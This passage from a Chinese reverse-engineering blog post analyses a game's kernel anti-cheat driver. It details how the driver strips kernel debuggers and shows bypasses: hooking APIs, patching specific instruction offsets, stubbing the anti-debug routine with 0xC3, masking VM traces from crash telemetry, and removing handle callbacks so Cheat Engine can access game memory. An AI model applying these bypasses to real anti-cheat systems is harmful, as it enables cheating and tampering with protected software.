title="IsDebuggerPresent"></a>IsDebuggerPresent</h4><p>这个已经被玩烂了的 API 相信是第一个被考虑到的，hook它永远返回 0 就行了。</p><h4 id="最终效果-1"><a href="#最终效果-1" class="headerlink" title="最终效果"></a>最终效果</h4><img src="/2025/02/14/Game6/10.png" class=""><p>可以在虚拟机中，附加调试器的情况下运行该二次元开放世界冒险游戏且不报错。</p><h2 id="R0分析"><a href="#R0分析" class="headerlink" title="R0分析"></a>R0分析</h2><p>主要尝试分析检测逻辑，尽可能地在不影响功能的情况下过掉检测。</p><h3 id="反调试-1"><a href="#反调试-1" class="headerlink" title="反调试"></a>反调试</h3><p>先给结论：反调试主要由驱动创建的一个线程实现，入口点在 <code>0x2f0c0</code>，重复顺序执行以下逻辑：</p><ul><li>读取 <code>KdDebuggerEnabled</code> 标志位，如果置 <code>1</code> 则清零。</li><li>找到寻找 <code>kdcom.dll</code>，使用 MDL 的方式将 <code>kdcom.dll</code> 的 <code>data</code> 段清零。</li><li>读取 <code>KdDebuggerNotPresent</code> 标志位。</li><li>读取 <code>KdDebuggerEnabled</code> 标志位。</li><li>读取 <code>KdDebuggerNotPresent</code> 标志位。</li></ul><p>下面给出笔者的分析步骤和对应的解决方案。</p><h4 id="动态调试"><a href="#动态调试" class="headerlink" title="动态调试"></a>动态调试</h4><p>R0 层的反调试其实反而没那么难，因为 API 就那么几个，HxxxKProtect.sys 的反调试具体表现为，在双机调试的情况下成功加载之后会导致调试器无响应。</p><p>根R0调试相关的API找一下即可，通过 IDA 直接搜索导入表或者字符串，得到以下几个跟调试器相关的</p><ul><li>KdDebuggerNotPresent</li><li>KdDebuggerEnabled</li></ul><p>根据查阅 MSDN 可知，这两个是内核中的标志位，尝试 hook 将它修改到其它位置。运行之后发现调试器依旧被剥离，但是虚拟机似乎也卡死，并没有蓝屏，在游戏终端中发现了上传日志。</p><img src="/2025/02/14/Game6/11.png" class=""><p>路径中可以看到上传了由于驱动导致的蓝屏（dmp），和自己的信息文件。</p><p>info.txt 包含了操作系统的信息，硬件信息和uid信息。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">version:5.2_rel CNRELWin5.2.0_28336591_29063028_28887986_28772242_28351161</span><br><span class="line">deviceName:DESKTOP-DLBRLIS</span><br><span class="line">time:2024-12-28 15.08.15.9001</span><br><span class="line">deviceModel:VMware20,1 (VMware, Inc.)</span><br><span class="line">operatingSystem:Windows 10  (10.0.19045) 64bit Microsoft Windows NT 10.0.19045.0</span><br><span class="line">uid:14xxxxxx3</span><br><span class="line">memoryInfo:695</span><br><span class="line">cpuInfo:Intel(R) Core(TM) i9-14900HX</span><br><span class="line">gpuInfo:VMware SVGA 3D</span><br><span class="line">clientIp:fe80::374b:96c4:2526:ec61</span><br><span class="line">isRelease:1</span><br><span class="line">type:Windows Crash Release</span><br></pre></td></tr></table></figure><p>这些信息大概率都是注册表或者一个 API <code>GetSystemFirmwareTable</code> 读出来的，这里为了防止被上传，最好把注册表处理干净，所有跟 Vmware 相关的全部替换掉。</p><p>其它特征去除直接用大表哥的 <a href="https://github.com/hzqst/VmwareHardenedLoader">vmloader</a>（大表哥nb），不知道这里怎么访问这两个标志的，所以先尝试 Hook MmGetSystemRoutineAddress，再去导入表替换两个标志位。</p><p>创建一个线程，持续输出两个标志位</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">VOID <span class="title">Routine</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">while</span> (TRUE) &#123;</span><br><span class="line">        <span class="built_in">DBG_PRINT</span>(<span class="string">&quot;%d %d\n&quot;</span>, *KdDebuggerEnabled, *KdDebuggerNotPresent);</span><br><span class="line">        LARGE_INTEGER interval;</span><br><span class="line">        interval.QuadPart = <span class="number">-10ll</span> * <span class="number">1000</span> * <span class="number">1000</span>; </span><br><span class="line">        <span class="built_in">KeDelayExecutionThread</span>(KernelMode, FALSE, &amp;interval);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>附加调试器的情况下，输出应当是 <code>1 0</code>。</p><p>加载游戏之后，会发现标志位变为了 <code>0 1</code>，而 <code>KdDebuggerEnabled</code> 标志位一旦被复位，windbg 会直接被剥离，因此需要阻止。</p><p>这里本想尝试加载驱动后，设置硬件断点在 KdDebuggerEnabled 字符串和对应的标志位中，但是似乎会有检测，如果设置了硬断驱动则会加载失败。</p><img src="/2025/02/14/Game6/12.png" class=""><p>通过动调，还是找到了关键的指令。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">.upx0:000000014034794F                 mov     rsi, [rcx]</span><br><span class="line">.upx0:0000000140347952                 mov     [r11], rsi</span><br></pre></td></tr></table></figure><p>这一步 RCX 读取了自身驱动导入表的那个指针，存到了 r11 指向的内存</p><img src="/2025/02/14/Game6/13.png" class=""><p>经过多次调试，最终确定写入的指令为</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">.upx0:00000001402BD371                 lock xchg r11d, [rax]</span><br><span class="line">.upx0:00000001402BD375                 bt      r10w, r10w</span><br></pre></td></tr></table></figure><p>如下所示（本次调试截图与上面截图不是同一次调试）</p><img src="/2025/02/14/Game6/14.png" class=""><p>这里再次确认一下：</p><ul><li>确认该指令确实修改了 KdDebuggerEnabled 标志位</li><li>确认该指令只被用于写 KdDebuggerEnabled 标志位</li></ul><p>第一点很好判断，直接软件断点走过来，观察这条指令前后标志位的变化，从下图来看，基本可以确认了，虽然 KdDebuggerEnabled 和 RAX 指向的地址不同，但是它们一定是映射了同一个物理页。</p><img src="/2025/02/14/Game6/15.png" class=""><p>第二点经过确认，至少第一次触发该指令就是用于修改这个标志位的，把这个指令 Patch 掉之后，会被蓝屏，蓝屏模块为 <code>kdcom.dll</code>，蓝屏代码为 <code>IRQL_NOT_LESS_OR_EQUAL</code>。</p><img src="/2025/02/14/Game6/kdcom.png" class=""><p>毫无疑问，调试出问题了，看起来内核调试不仅仅是靠这一个标志位决定的（之前一直不知道）。于是想着去分析一下官方的 API，来看看剥离内核调试器需要做什么样的步骤。分析了一会发现想的都是错的，应该是用了一些我们平时想不到的操作去做的。</p><h4 id="模拟执行"><a href="#模拟执行" class="headerlink" title="模拟执行"></a>模拟执行</h4><p>也是此时，猛然回首，感觉自己可能正往错误的方向行进，vmp 调起来太累，又不会还原。这时候想到了模拟执行，在队里师傅的帮助下，找到 <a href="https://github.com/waryas/KACE">KACE</a> 这个模拟执行的工具，但是编译什么的都很有问题，且需要自己装 zydis 库，而最新的版本又没适配最新的 zydis，甚至很多结构都改变了，遂尝试自己修一下，下面给出我修好的版本 <a href="https://github.com/xia0ji233/KACE%E3%80%82">https://github.com/xia0ji233/KACE。</a></p><p>模拟执行最关键的一点就是驱动要能独立加载，比如能直接使用 <code>monitor</code> 或者 <code>sc</code> 这种简单的工具加载，很不幸这个二次元开放世界冒险游戏并不能。分析其 R3 的行为，发现游戏运行的时候会往注册表写下一个 <code>ConfigData</code>，加载驱动之后会立刻删除，由于中间延时还挺高，所以可以捕获这一过程。</p><img src="/2025/02/14/Game6/16.png" class=""><p>分析这串数据时间成本过高，所以可以选择，先运行 yxxxshen.exe，等到写上去之后再马上运行模拟器，就可以成功在模拟器中跑起来</p><img src="/2025/02/14/Game6/17.png" class=""><hr><h4 id="综合分析"><a href="#综合分析" class="headerlink" title="综合分析"></a>综合分析</h4><p>下面分析 <code>DriverEntry</code> 的执行步骤。</p><ul><li>读取注册表中的 <code>ConfigData</code>，判断游戏是否正确启动。</li><li>创建设备 <code>\Device\HXXXProtect</code></li><li>读取页目录基址</li><li>调用 <code>PsLookupProcessByProcessId</code> 获取 system 进程的 EProcess</li><li>随后又使用了 <code>MmGetSystemRoutineAddress</code> 获取了一遍 <code>PsLookupProcessByProcessId</code> 地址</li><li>读取 <code>MSR_LSTAR</code> 获得 syscall 的入口点</li></ul><p>直到这里，模拟执行已经跑不出什么更加细节的东西了，转动态调试。</p><p>调试器中手动 rdmsr 拿到返回的地址下硬件读断点，截取到驱动的读取操作，驱动拿到了 MSR 返回的 syscall 地址之后，先判断了该地址是否合法，再尝试读取其中的四字节数，并且有一个循环，循环每次加1，从图中可以清晰看到。</p><img src="/2025/02/14/Game6/18.png" class=""><p>随后将拿到的四字节整数进行了 <code>&amp;0x00F0FFFF</code> 的操作，最后和 <code>0x00108D4C</code> 判断是否相等，转小端序来看，它需要找到类似这样的特征码 <code>4C 8D 1? ??</code>，这里不管直接在条件满足的分支下断点，在 <code>jne</code> 下方下断点再过来看看它找到了什么位置。</p><img src="/2025/02/14/Game6/19.png" class=""><p>也就是说拿到了 <code>KiSystemServiceRepeat</code> 的地址，通过搜索找到了一篇<a href="https://www.cnblogs.com/LyShark/p/11639533.html">文章</a>，里面提到了通过 MSR 寻找得到未导出的 <code>KeServiceDescriptorTable</code> 和 <code>KeServiceDescriptorTableShadow</code>，文章里面使用了特征偏移的方法寻找这两个表，当然不同的系统版本这个值必然也不同，因此该驱动使用了兼容性更好的特征 <code>KiSystemServiceRepeat</code> 函数头的方式去寻找这个偏移，拿到对应的两个表的地址。</p><p>随后必然读了两个表，之前模拟执行也得到过该结论</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">[TID:0000625c]  Emulating read from ntoskrnl.exe:+00e018d0</span><br><span class="line">[TID:0000625c]  Executing ntoskrnl.exe!MmIsAddressValid</span><br><span class="line">[TID:0000625c]          Checking if address is valid : 7ff716feca40</span><br><span class="line">[TID:0000625c]  Getting data @ ntoskrnl.exe!KeServiceDescriptorTable</span><br><span class="line">[TID:0000625c]  Getting data @ ntoskrnl.exe!KeServiceDescriptorTableShadow</span><br><span class="line">[TID:0000625c]  Emulating read from ntoskrnl.exe:+00e018d0</span><br><span class="line">[TID:0000625c]  Executing ntoskrnl.exe!MmIsAddressValid</span><br><span class="line">[TID:0000625c]          Checking if address is valid : 0</span><br></pre></td></tr></table></figure><p>下两个硬件断点发现仅仅是判断了一下两张表的表头内容是否一致</p><img src="/2025/02/14/Game6/20.png" class=""><p>然后读走了熟悉的 <code>0x1d8</code>（表中系统服务的数量）。</p><p>随后调用了 <code>MmIsAddressValid</code>，在模拟器中可以看到，模拟调用了一个0，因为模拟器的局限性，不太可能还原真实的内核情况，那来看看实际上它取的 0 来自哪里。</p><img src="/2025/02/14/Game6/123.png" class=""><p>是 <code>FFFFF8052FCC79F0</code>，也就是 SSDT 存的 <code>KiServiceTable</code>，也许很大概率是发现 SSDT 存的 <code>KiServiceTable</code> 为 0 了，所以模拟器加载驱动才会失败。</p><p>在模拟器中简单实现这两个结构之后，驱动就照着走后续加载的逻辑</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">[TID:00002b88]  Getting data @ ntoskrnl.exe!KeServiceDescriptorTable</span><br><span class="line">[TID:00002b88]  Getting data @ ntoskrnl.exe!KeServiceDescriptorTableShadow</span><br><span class="line">[TID:00002b88]  Emulating read from ntoskrnl.exe:+00e018d0</span><br><span class="line">[TID:00002b88]  Executing ntoskrnl.exe!MmIsAddressValid</span><br><span class="line">[TID:00002b88]          Checking if address is valid : 7ff7a2c402c0</span><br><span class="line">[TID:00002b88]  Executing ntoskrnl.exe!MmIsAddressValid</span><br><span class="line">[TID:00002b88]          Checking if address is valid : 7ff7170f18c0</span><br><span class="line">[TID:00002b88]  Executing ntoskrnl.exe!KeInitializeEvent</span><br><span class="line">[TID:00002b88]          Event object : 7ff6375c7710</span><br><span class="line">[TID:00002b88]  Executing ntoskrnl.exe!ExAllocatePoolWithTag</span><br><span class="line">[TID:00002b88]  Executing ntoskrnl.exe!KeInitializeEvent</span><br><span class="line">[TID:00002b88]          Event object : 22326561050</span><br><span class="line">[TID:00002b88]  Executing ntoskrnl.exe!ExAllocatePoolWithTag</span><br><span class="line">[TID:00002b88]  Executing ntoskrnl.exe!ExAllocatePoolWithTag</span><br><span class="line">[TID:00002b88]  Executing ntoskrnl.exe!ExInitializeResourceLite</span><br><span class="line">[TID:00002b88]                  INSIDE STUB, RETURNING 0</span><br><span class="line">[TID:00002b88]  Executing ntoskrnl.exe!ExAllocatePoolWithTag</span><br><span class="line">[TID:00002b88]  Executing ntoskrnl.exe!ExInitializeResourceLite</span><br><span class="line">[TID:00002b88]                  INSIDE STUB, RETURNING 0</span><br><span class="line">[TID:00002b88]  Reading CR8</span><br><span class="line">[TID:00002b88]  Reading CR8</span><br><span class="line">[TID:00002b88]  Executing ntoskrnl.exe!RtlInitUnicodeString</span><br><span class="line">[TID:00002b88]  Executing ntoskrnl.exe!ZwCreateFile</span><br><span class="line">[TID:00002b88]          Creating file : \SystemRoot\System32\csrss.exe</span><br><span class="line">[TID:00002b88]          Return : 00000000</span><br><span class="line">[TID:00002b88]  Getting data @ ntoskrnl.exe!IoFileObjectType</span><br><span class="line">[TID:00002b88]  Exported Data ntoskrnl.exe!IoFileObjectType is not implemented</span><br><span class="line">[TID:00002b88]  Emulating read from ntoskrnl.exe:+00cfc448</span><br><span class="line">[TID:00002b88]  Executing ntoskrnl.exe!ObReferenceObjectByHandle</span><br><span class="line">[TID:00002b88]  Executing ntoskrnl.exe!ZwClose</span><br><span class="line">[TID:00002b88]          Closing Kernel Handle : 1c4</span><br><span class="line">[TID:00002b88]  Executing ntoskrnl.exe!ExAllocatePoolWithTag</span><br><span class="line">[TID:00002b88]  Reading CR8</span><br></pre></td></tr></table></figure><p>通过模拟器打印对应的指令去trace，最终在驱动文件找到了对应的调用函数，幸运的是这个函数没被v，看一下大致逻辑</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> __fastcall <span class="title">sub_140028B70</span><span class="params">(<span class="keyword">struct</span> _OBJECT_NAME_INFORMATION **a1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    _DWORD v2[<span class="number">15</span>]; <span class="comment">// [rsp+20h] [rbp-E0h] BYREF</span></span><br><span class="line">    <span class="comment">//...</span></span><br><span class="line">    <span class="comment">//some definition</span></span><br><span class="line">    v2[<span class="number">0</span>] = <span class="number">0x53005C</span>;</span><br><span class="line">    <span class="comment">//...</span></span><br><span class="line">    <span class="comment">//Imm assgin</span></span><br><span class="line">    </span><br><span class="line">    v11 = <span class="number">0</span>;</span><br><span class="line">    <span class="built_in">sub_140029100</span>((__int64)a1, (<span class="type">const</span> WCHAR *)v2, a1 + <span class="number">16</span>);</span><br><span class="line">    <span class="built_in">sub_140029100</span>((__int64)a1, (<span class="type">const</span> WCHAR *)v4, a1 + <span class="number">17</span>);</span><br><span class="line">    <span class="built_in">sub_140029100</span>((__int64)a1, (<span class="type">const</span> WCHAR *)v12, a1 + <span class="number">18</span>);</span><br><span class="line">    <span class="built_in">sub_140029100</span>((__int64)a1, (<span class="type">const</span> WCHAR *)v6, a1 + <span class="number">19</span>);</span><br><span class="line">    <span class="built_in">sub_140029100</span>((__int64)a1, (<span class="type">const</span> WCHAR *)v8, a1 + <span class="number">20</span>);</span><br><span class="line">    <span class="built_in">sub_140029100</span>((__int64)a1, (<span class="type">const</span> WCHAR *)v13, a1 + <span class="number">21</span>);</span><br><span class="line">    <span class="built_in">sub_140029100</span>((__int64)a1, (<span class="type">const</span> WCHAR *)v15, a1 + <span class="number">22</span>);</span><br><span class="line">    <span class="built_in">sub_140029100</span>((__int64)a1, (<span class="type">const</span> WCHAR *)v10, a1 + <span class="number">23</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>其中，<code>sub_140029100</code> 是它封装的打开文件的函数，下面给出相关的反编译结果，这里的调用链路也很符合模拟器跑的结果，既然没 v，那就直接拦截，断点，调试一气呵成。</p><img src="/2025/02/14/Game6/22.png" class=""><p>最终发现对以下 8 个文件进行了打开操作。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">\SystemRoot\System32\csrss.exe</span><br><span class="line">\SystemRoot\System32\lsass.exe</span><br><span class="line">\SystemRoot\System32\svchost.exe</span><br><span class="line">\SystemRoot\SysWow64\svchost.exe</span><br><span class="line">\SystemRoot\System32\audiodg.exe</span><br><span class="line">\SystemRoot\System32\services.exe</span><br><span class="line">\SystemRoot\System32\wbem\wmiprvse.exe</span><br><span class="line">\SystemRoot\SysWow64\wbem\wmiprvse.exe</span><br></pre></td></tr></table></figure><p>并且获取了它们的完整名称，后续进行的操作都 v 了，不过看后面有类似验 <code>hash</code> 的操作，感觉可能是检查这些进程的签名，如果是白签名那么不限制获取游戏的句柄。</p><p>（以上分析皆来自 5.2 版本，后续分析使用了 5.3 版本）</p><p>随后使用模拟器跑</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">[TID:00005e28]  Executing ntoskrnl.exe!PsSetCreateProcessNotifyRoutineEx</span><br><span class="line">[TID:00005e28]  Executing ntoskrnl.exe!ExInitializePushLock</span><br><span class="line">[TID:00005e28]                  INSIDE STUB, RETURNING 0</span><br><span class="line">[TID:00005e28]  Executing ntoskrnl.exe!PsSetLoadImageNotifyRoutine</span><br><span class="line">[TID:00005e28]  Executing ntoskrnl.exe!ExInitializePushLock</span><br><span class="line">[TID:00005e28]                  INSIDE STUB, RETURNING 0</span><br><span class="line">[TID:00005e28]  Executing ntoskrnl.exe!PsSetCreateThreadNotifyRoutine</span><br><span class="line">[TID:00005e28]  Executing ntoskrnl.exe!ExInitializeResourceLite</span><br><span class="line">[TID:00005e28]                  INSIDE STUB, RETURNING 0</span><br><span class="line">[TID:00005e28]  Executing ntoskrnl.exe!ExAllocatePoolWithTag</span><br><span class="line">[TID:00005e28]  Executing ntoskrnl.exe!ExInitializePushLock</span><br><span class="line">[TID:00005e28]                  INSIDE STUB, RETURNING 0</span><br><span class="line">[TID:00005e28]  Executing ntoskrnl.exe!ExCreateCallback</span><br><span class="line">[TID:00005e28]          Callback object : 299ce937f90</span><br><span class="line">[TID:00005e28]          *Callback object : 0</span><br><span class="line">[TID:00005e28]          Callback name : \Callback\PowerState</span><br><span class="line">[TID:00005e28]  Executing ntoskrnl.exe!ExRegisterCallback</span><br><span class="line">[TID:00005e28]  Executing ntoskrnl.exe!KeAreApcsDisabled</span><br><span class="line">[TID:00005e28]  Executing ntoskrnl.exe!ExEnterCriticalRegionAndAcquireResourceExclusive</span><br><span class="line">[TID:00005e28]                  INSIDE STUB, RETURNING 0</span><br><span class="line">[TID:00005e28]  Executing ntoskrnl.exe!ExAllocatePoolWithTag</span><br><span class="line">[TID:00005e28]  Executing ntoskrnl.exe!ExReleaseResourceAndLeaveCriticalRegion</span><br><span class="line">[TID:00005e28]                  INSIDE STUB, RETURNING 0</span><br><span class="line">[TID:00005e28]  Executing ntoskrnl.exe!PsCreateSystemThread</span><br><span class="line">[TID:00009cb8]  Thread Initialized, starting...</span><br><span class="line">[TID:00005e28]          Thread created at 299ce91f0c0</span><br><span class="line">[TID:00009cb8]  Executing ntoskrnl.exe!PsGetCurrentThreadId</span><br><span class="line">[TID:00005e28]  Executing ntoskrnl.exe!ZwClose</span><br><span class="line">[TID:00005e28]          Closing Kernel Handle : 1c4</span><br><span class="line">[TID:00009cb8]  Executing ntoskrnl.exe!KeSetPriorityThread</span><br><span class="line">[TID:00005e28]  Executing ntoskrnl.exe!KeQueryTimeIncrement</span><br></pre></td></tr></table></figure><p>无非就是注册回调，创建线程，后续主线程退出，因为没有写 wdf 对应的框架的 API，所以模拟器里面不会正确返回 0，但是DriverEntry 的逻辑确实是跑完了。可见反调试并不在 DriverEntry 当中，应该在创建的线程中，创建线程的地址在 <code>+0x2f0c0</code> 的地址上，这个地址虽然是 <code>.text</code> 段，但是 v 了，不太好静态分析，选择模拟器分析。</p><h4 id="针对标志位的反调试"><a href="#针对标志位的反调试" class="headerlink" title="针对标志位的反调试"></a>针对标志位的反调试</h4><p>直接把 DriverEntry 设置为线程入口点试试看跑的结果，关键反调试的 Log 如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">[TID:0000a3dc]  Driver Base at 7ff7bb200000</span><br><span class="line">[TID:0000b058]  [Warning] Read with execute at 00007FF7BB571B7A</span><br><span class="line">[TID:0000b058]  Getting data @ ntoskrnl.exe!KdDebuggerEnabled</span><br><span class="line">[TID:0000b058]  [Warning] Read with execute at 00007FF7BB553B1C</span><br><span class="line">[TID:0000b058]  Getting data @ ntoskrnl.exe!KdDebuggerNotPresent</span><br><span class="line">[TID:0000b058]  [Warning] Read with execute at 00007FF7BB53E5C9</span><br><span class="line">[TID:0000b058]  Getting data @ ntoskrnl.exe!KdDebuggerEnabled</span><br><span class="line">[TID:0000b058]  [Warning] Read with execute at 00007FF7BB56B94C</span><br><span class="line">[TID:0000b058]  Getting data @ ntoskrnl.exe!KdDebuggerNotPresent</span><br></pre></td></tr></table></figure><p>在四处地方都有读取调试标志位的操作，计算得到偏移如下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">0x371b7a</span><br><span class="line">0x353b1c</span><br><span class="line">0x33e5c9</span><br><span class="line">0x36b94c</span><br></pre></td></tr></table></figure><p>模拟器中没跑出写 KdDebuggerEnabled 的操作，大概率因为在模拟器中该标志为0才不会执行写的操作，这里在读的 case 这里判断一下将 KdDebuggerEnabled 读取的数值修改为 1。</p><img src="/2025/02/14/Game6/23.png" class=""><p>执行结果如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">[TID:00005aac]  Driver Base at 7ff7bb200000</span><br><span class="line">[TID:0000a8c8]  [Warning] Read with execute at 00007FF7BB571B7A</span><br><span class="line">[TID:0000a8c8]  Getting data @ ntoskrnl.exe!KdDebuggerEnabled</span><br><span class="line">[TID:0000a8c8]  [Warning] change KdDebuggerEnabled flags 00007FF7BB571B7A</span><br><span class="line">[TID:0000a8c8]  [Info] Write Violation at 00007FF7BB481D20</span><br><span class="line">[TID:0000a8c8]  Getting data @ ntoskrnl.exe!KdDebuggerEnabled</span><br><span class="line">[TID:0000a8c8]  Unhandled Mnemonic.</span><br></pre></td></tr></table></figure><p>得到写入 KdDebuggerEnabled 的指令偏移为 <code>0x281d20</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.upx0:0000000140281D20 F0 45 87 19                    lock xchg r11d, [r9]</span><br></pre></td></tr></table></figure><p>将它改为 <code>mov r11d, [r9]</code> 指令，再来看看会不会被剥离调试器，经测试发现 kdcom 还是蓝屏，那么尝试在读取的指令入手，经测试，<code>0x371b7a</code> 若读到了 1 则会写，因此尝试把这里的</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.upx0:0000000140371B7A 66 41 0F B6 12                 movzx   dx, byte ptr [r10]</span><br></pre></td></tr></table></figure><p>改为 <code>xor dx,dx</code>，同理改掉四个读取的位置，让它们读的值分别为未调试状态读取的值，但是会导致虚拟机被卡死，同时调试器也是未响应的状态，似乎没什么思路了，于是再次考虑动态调试。</p><h4 id="针对kdcom的反调试"><a href="#针对kdcom的反调试" class="headerlink" title="针对kdcom的反调试"></a>针对kdcom的反调试</h4><p>因为当时会蓝屏，所以修改系统设置获取完整的 Memory.dmp，一通分析发现 <code>data</code> 段被清零了。</p><img src="/2025/02/14/Game6/BSOD.png" class=""><p>最后通过动态调试发现了一个神秘的函数</p><img src="/2025/02/14/Game6/24.png" class=""><p>看到这个函数基本可以验证刚才的猜想了，那就直接把这个函数覆盖 <code>0xC3</code>，观察是否蓝屏。</p><img src="/2025/02/14/Game6/25.png" class=""><p>发现已经完全不会蓝屏，调试器也可以正常工作，那就意味着后面可以正常调试游戏驱动保护了。</p><p>尝试分析这个函数，研究它是怎么干掉调试器的。</p><img src="/2025/02/14/Game6/26.png" class=""><p>通过 <code>ZwQuerySystemInformation</code> 获取 <code>kdcom.dll</code> 的基址和模块大小。</p><img src="/2025/02/14/Game6/27.png" class=""><p>随后通过解析 PE 文件找到 <code>.data</code> 段的基址和大小。</p><img src="/2025/02/14/Game6/28.png" class=""><p>随后获取到该段的物理地址，使用 MDL 映射该内存（虽然+0x39240函数被 v 了，但可以合理怀疑这个函数就是申请 MDL 使用的，后续通过动态调试也能得到这个结论）。</p><img src="/2025/02/14/Game6/29.png" class=""><p>进入这个 memset 函数，可以发现将 <code>kdcom.dll</code> 的 <code>magic</code> 清零之后 <code>kdcom</code> 工作将不正常，其中 <code>fffff8033e455000</code> 为模块本身的虚拟内存，<code>RCX</code> 指向了 <code>MDL</code> 分配的虚拟内存，此时汇编代码通过 <code>RCX</code> 写入 <code>0</code>，在现在这种情况下，单步调试会导致调试器直接断开。</p><p>绕过的思路也很简单，抹 PE 头是最简单粗暴 &amp; 安全的方式，因为在获取 NT 头的时候会进行 magic 判断，判断不成功自然不会去搞 kdcom 了。</p><img src="/2025/02/14/Game6/PE.png" class=""><p>但是都 inline hook 了那么多，再多这一个又有什么所谓呢</p><img src="/2025/02/14/Game6/emoji1.png" class=""><p>不是，这这这这是是是是谁把 C3 放到我游戏驱动的反调试函数头了，这这这是谁不成心……</p><img src="/2025/02/14/Game6/emoji2.png" class=""><p>嗯，一定是太阳黑子射到了内存，把它改成C3了，总不能是一个黑签名驱动调用了 <code>PsSetLoadImageNotifyRoutine</code> 注册了加载模块回调，然后识别 <code>HxxxYOKProtect.sys</code> 再用 <code>MDL</code> 把这个内存给改了吧。 </p><h3 id="回调分析"><a href="#回调分析" class="headerlink" title="回调分析"></a>回调分析</h3><p>注册了如下回调</p><ul><li>创建线程&#x2F;进程回调</li><li>获取&#x2F;复制线程&#x2F;进程句柄回调：屏蔽了大部分危险的权限</li><li>模块加载回调</li></ul><p>yxxxshen 以前是有主动的句柄降权的，但是这个版本测试下来没有开，只能等开了再分析，并且其它回调通过 hook 和模拟执行等手段并没有发现做了什么操作。</p><h4 id="进程、线程句柄回调"><a href="#进程、线程句柄回调" class="headerlink" title="进程、线程句柄回调"></a>进程、线程句柄回调</h4><p>不管是直接拦还是 ARK 工具看都很方便，这里还是选择hook，拿到句柄之后直接取消这个回调，看看 CE 能否直接读写内存。</p><img src="/2025/02/14/Game6/30.png" class=""><p>用 ARK 工具可以看到，这里驱动正常加载，且正常注册了进程&#x2F;线程创建回调和模块加载回调，去特征 CE 不加载 DBK 